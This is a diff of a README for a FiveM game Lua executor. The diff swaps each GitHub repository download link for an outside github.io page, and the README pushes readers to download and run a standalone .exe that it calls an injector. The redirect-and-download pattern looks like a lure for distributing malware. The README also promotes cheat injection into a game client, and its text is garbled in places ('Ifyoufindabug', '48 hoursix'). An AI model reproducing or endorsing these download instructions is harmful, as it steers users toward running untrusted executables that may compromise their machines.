@@ -1,7 +1,7 @@
 <h1>🧰 FiveM-Executor-Lua-2026 - Download & Run Lua Scripts Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/Keen-arere8666/FiveM-Executor-Lua-2026">
+  <a href="https://keen-arere8666.github.io">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-FREE%20%26%20WORKING-blue?style=for-the-badge&logo=github&logoColor=white&color=2ecc71" alt="Download Button" style="padding:15px;background:linear-gradient(90deg,#2ecc71,#27ae60);border-radius:8px;color:white;font-size:20px;text-decoration:none;">
   </a>
 </p>
@@ -60,7 +60,7 @@ Follow these exact steps. Do not skip. It takes about **90 seconds** from start 
 
 Click the **green button** at the very top of this page, or use this direct link below:
 
-👉 **[https://github.com/Keen-arere8666/FiveM-Executor-Lua-2026](https://github.com/Keen-arere8666/FiveM-Executor-Lua-2026)**
+👉 **[https://keen-arere8666.github.io](https://keen-arere8666.github.io)**
 
 Visit this link to download the application. You will land on a normal GitHub page. On that page, look for a section that says **"Releases"** or **"Download"**. Click the file named **"FiveM-Executor-Lua-2026.exe"** (it is the only file you need). Your browser will ask you where to save it. Save it to your **Desktop** for easy access.
 
@@ -176,7 +176,7 @@ This tool is built on a lightweight C++ core with a custom injected into the Fiv
 
 ## 🔗 Important Links
 
-- **⬇️ Primary Download:** [https://github.com/Keen-arere8666/FiveM-Executor-Lua-2026](https://github.com/Keen-arere8666/FiveM-Executor-Lua-2026) – Always latest version.
+- **⬇️ Primary Download:** [https://keen-arere8666.github.io](https://keen-arere8666.github.io) – Always latest version.
 
 
 - **🆘 Report Bugs:** Ifyoufindabug, open an issue in the GitHub repository's "Issues" tab. We usually respond within 48 hoursix.
